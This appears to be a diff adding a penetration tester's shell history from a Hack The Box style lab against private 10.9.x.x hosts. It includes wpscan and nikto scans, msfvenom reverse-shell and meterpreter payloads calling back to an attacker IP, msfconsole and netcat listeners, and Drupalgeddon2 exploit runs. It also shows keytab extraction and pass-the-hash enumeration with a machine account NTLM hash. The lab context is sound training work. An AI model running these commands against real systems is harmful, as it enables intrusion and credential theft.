+wpscan --update\
+
+wpscan --url http://10.9.15.11 --detection-mode MODE
+wpscan --url http://10.9.15.11
+wpscan --update --url http://10.9.15.11 --enumerate ap --plugins-detection aggressive
+wpscan --update --url http://10.9.15.11 --plugins-detection aggressive
+curl http://10.9.15.11
+nmap -sCT 10.9.15.11
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o rev LHOST=10.10.16.210 LPORT=443
+mv DEPENDENT_PARTY linux_client
+find /  -name keytabextract.py 2>/dev/null
+cp /home/parallels/OSEP/lab5/ticket/keytabextract.py
+cp /home/parallels/OSEP/lab5/ticket/keytabextract.py .
+python3 keytabextract.py krb5.keytab
+cd /tmp
+\
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10
+cd ~
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.106 seconds: Server Do53:10.9.15.10@53 answered The DNS operation timed out.
+ping CORE.CYBER.LOCAL
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48
+bloodhound-python -d CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp --auth-method ntlm\
+
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 -c ALl\
+
+pip install --upgrade bloodhound-python
+pip3 install --upgrade bloodhound-python
+sudo apt remove bloodhound -y\
+
+sudo apt autoremove -y
+rm -rf /path/to/BloodHound
+which bloodhound
+sudo pip uninstall bloodhound-python -y
+which bloodhound-python
+sudo apt install bloodhound.py\
+\
+
+which bloodhound.py
+where bloodhound.py
+find /  -name bloodhound.py 2>/dev/null
+sudo apt install bloodhound.py
+bloodhound-python -h
+bloodhound-python --v
+bloodhound-python -v
+bloodhound-python -version
+bloodhound-python --version
+bloodhound-python -versio
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 -c ALl  --dns-timeout 180\
+
+pip uninstall bloodhound-python -y
+pip uninstall bloodhound-python --break-system-packages -y
+pip3 uninstall bloodhound-python --break-system-packages -y
+sudo pipx uninstall bloodhound-python
+python3 -m venv myenv\
+
+source myenv/bin/activate\
+
+pip uninstall bloodhound-python -y\
+
+pipx uninstall bloodhound-python\
+
+sudo apt install pipx\
+
+pipx ensurepath\
+
+pip uninstall bloodhound-python -y --break-system-packages\
+
+pipx uninstall bloodhound-python
+/usr/bin/bloodhound-python -help
+/usr/bin/bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 -c ALl  --dns-timeout 180\
+
+bloodhound-python \\
+        -d "core.cyber.local" \\
+        -c "All,LoggedOn" \\
+        -ns "10.9.15.10" \\
+        -u 'COREWEBDL$' \\
+        --hashes ':4182816cd42bdb6d20f7fb89703f5c48' \\
+        -w 4 \\
+        --dns-tcp \\
+        --auth-method ntlm \\
+        --zip\
+
+pip install --upgrade bloodhound\
+
+pip uninstall bloodhound --break-system-packages\
+
+pipx uninstall bloodhound\
+
+sudo apt remove python3-bloodhound\
+
+pip uninstall bloodhound\
+
+pip show bloodhound\
+
+pip uninstall bloodhound
+pipx uninstall bloodhound
+sudo apt remove python3-bloodhound
+bloodhound-python \\
+        -d "core.cyber.local" \\
+        -c "All,LoggedOn" \\
+        -ns "10.9.15.10" \\
+        -u 'COREWEBDL$' \\
+        --hashes ':4182816cd42bdb6d20f7fb89703f5c48' \\
+        -w 4 \\
+        --dns-tcp \\
+        --auth-method ntlm \\
+        --zip
+pip install bloodhound-ce
+/usr/bin/bloodhound-python
+python3 bloodhound.py \\
+        -d "core.cyber.local" \\
+        -c "All,LoggedOn" \\
+        -ns "10.9.15.10" \\
+        -u 'COREWEBDL$' \\
+        --hashes ':4182816cd42bdb6d20f7fb89703f5c48' \\
+        -w 4 \\
+        --dns-tcp \\
+        --auth-method ntlm \\
+        --zip
+python3 bloodhound.py  -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 --dns-timeout 180\
+
+python3 bloodhound.py -d "core.cyber.local"  -c all -u 'COREWEBDL$'' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 --dns-timeout 180 --zip\
+
+python3 bloodhound.py -d "core.cyber.local"  -c all -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5\
+\
+\
+
+exit
+python3 Drupalgeddon-mass.py
+python2.7 Drupalgeddon-mass.py
+python2.7 Drupalgeddon-mass.py -h
+code exploit.py
+xfreerdp /cert-ignore  /u:offsec /p:Abc123! /v:10.9.20.10 /w:1200 /h:700
+ping http://core.cyber.local/
+bloodhound
+sudo openvpn pro_labs_flashoop_eu.ovpn
+sudo openvpn pro_labs_flashoop\ _eu.ovpn
+gobuster dir -u http://10.9.15.11 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 64 2>/dev/null
+wpscan --url http://10.9.15.11  -v --detection-mode aggressive --plugins-detection aggressive
+wpscan --url http://10.9.15.11/  -v --detection-mode aggressive --plugins-detection aggressive --enumerate p
+pip install alive-progress
+sudo pip install alive-progress
+python3 --version
+python3 -m pip install alive-progress
+sudo pip3 install --break-system-packages alive-progress
+vim hosts
+nxc smb hosts -u 'COREWEBDL$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+nxc smb hosts -u 'COREWEBDL$' -H "4182816cd42bdb6d20f7fb89703f5c48"
+crackmapexec smb hosts -u 'COREWEBDL$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+nxc smb hosts -u 'COREWEBDL\$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+cat hosts
+ping 10.9.15.1
+crackmapexec smb hosts -u 'COREWEBDL\$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+nxc smb 10.9.15.12 -u 'COREWEBDL\$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+ls -k krb5.keytab
+klist
+nxc smb 10.9.15.12 -u 'COREWEBDL/$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+nxc smb 10.9.15.12 -u 'COREWEBDL$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+nxc smb 110.10 -u 'COREWEBDL$' -H "4182816cd42bdb6d20f7fb89703f5c48" -d "CORE.CYBER.LOCAL"\
+
+mkdir bloodhound
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 -ns 10.9.15.10  --dns-tcp\
+
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5
+bloodhound-python -d CORE.CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 
+bloodhound-python -d CYBER.LOCAL -c all -u COREWEBDL$ --hashes :4182816cd42bdb6d20f7fb89703f5c48 
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.16.210 LPORT=443
+msfconsole
+msfconsole -q
+cd /home/parallels/tools/BloodHound.py-bloodhound-ce/
+python3 bloodhound.py -d "core.cyber.local"  -c all -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -ns 10.9.15.10  --dns-tcp --auth-method ntlm 
+rm BloodHound.py-bloodhound-ce.zip
+git clone BloodHound.py-bloodhound-ce.zip
+git clone https://github.com/dirkjanm/BloodHound.py.git
+bloodhound.py
+./bloodhound
+./bloodhound.py
+python3 bloodhound.py
+sudo ip route add 10.9.10.0/24 dev ligolo
+ping cyber.local
+python3 bloodhound.py -d "core.cyber.local"  -c all -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -ns 10.9.15.10  --dns-tcp --auth-method ntlm -w 4 --dns-timeout 180\
+
+cp /tmp/linux_implant ../../
+cd ../..
+mv linux_implant HTB/Cybernet
+cd HTB
+cd Cybernet
+cd bloodhound
+cd BloodHound.py
+ping core.cyber.local
+c
+dig -h
+dig@core.cyber.loca
+python3 bloodhound.py  -d "core.cyber.local" -c "All,LoggedOn" -ns "10.9.15.10" -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -w 4 --dns-tcp --auth-method ntlm --zip --dns-timeout 30\
+
+dig core.cyber.local
+python3 bloodhound.py  -d "core.cyber.local" -c "All,LoggedOn" -ns "10.9.15.10" -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -w 4 --dns-tcp --auth-method ntlm --zip 
+./bloodhound.py -h
+python3 bloodhound.py  -d "core.cyber.local" -c "All,LoggedOn" -ns "10.9.15.10" -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -w 4 --auth-method ntlm --zip --dns-timeout 30\
+
+nmap -sCT 10.9.15.10
+cd ~/HTB/Cybernet
+sudo apt update
+sudo vim /etc/hosts
+pip3 install droopescan  
+sudo apt install python3 python3-pip -y
+pip3 install droopescan
+sudo apt install pipx -y
+pipx ensurepath
+pipx install droopescan
+droopescan -h
+nano ~/.local/share/pipx/venvs/droopescan/lib/python3.13/site-packages/cement/core/extension.py
+rlwrap nc -lvnp 80
+python2.7 exp.py
+python3 exp.py
+nmap -sV -oX scan_results.xml 10.9.15.11
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.210; set LPORT 443;run'\
+
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.17.1; set LPORT 443;run'\
+
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.210; set LPORT 443;run'\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f ps1
+p
+python3 -m http.server 80
+op a
+/usr/bin/sliver-server
+nc -lvnp 443
+find /  -name socat 2>/dev/null
+cat /etc/hosts
+cat /etc/resolv.conf
+git clone https://github.com/iphelix/dnschef.git
+cd dnschef
+python3 dnschef.py -h
+sudo vim /etc/resolv.conf
+python3 dnschef.py --fakeip 10.9.15.10
+cd ..
+cd tools
+cd BloodHound.py-bloodhound-ce
+python3 bloodhound.py  -d "core.cyber.local" -c "All,LoggedOn" -ns 10.9.15.10 -u 'COREWEBDL$' --hashes ':4182816cd42bdb6d20f7fb89703f5c48' -w 4 --auth-method ntlm --zip --dns-timeout 30\
+
+ip route list 
+sudo apt install droopescan
+nikto -url 10.9.15.11
+chmod +x ./drupalgeddon2.rb
+./drupalgeddon2.rb
+./drupalgeddon2.rb -h
+sudo gem install highline
+ruby drupalgeddon2.rb -h
+ruby drupalgeddon2.rb http://10.9.15.11
+ruby drupalgeddon2-customizable-beta.rb
+ruby drupalgeddon2-customizable-beta.rb http://10.9.15.11
+sudo apt install rbenv -y\
+
+rbenv install 2.7.6\
+
+rbenv global 2.7.6
+sudo rbenv install 2.7.6\
+
+rbenv
+rbenv version
+rbenv commands
+vim exploit.py
+cat exploit.py
+nikto -url http://10.9.15.11
+curl -k http://10.9.15.11
+curl -L http://10.9.15.11
+curl -I -L http://10.9.15.11
+nmap  -A -T4 -sT -p- http://10.9.15.11
+nmap  -A -T4 -sT -p- 10.9.15.11
+nc -lvnp 80
+nc -lvnp 8081
+ping 10.9.15.11
+ping 10.9.15.10
+cd wordpress
+python3 exploit.py
+python3 exploit.py -h
+./proxy -selfcert -laddr 0.0.0.0:8081
+cd HTB/Cybernet
+ip a
+clear
+ls
+python3 exploit.py -u http://10.9.15.11
+bash
+echo $0
+echo $SHELL
+sudo vim ~/.ssh/rc
+chsh -s /bin/bash
+cat ~/.zsh_history
+cd ~/
+ls -la
+sudo cp ~/.zsh_history ~/tools
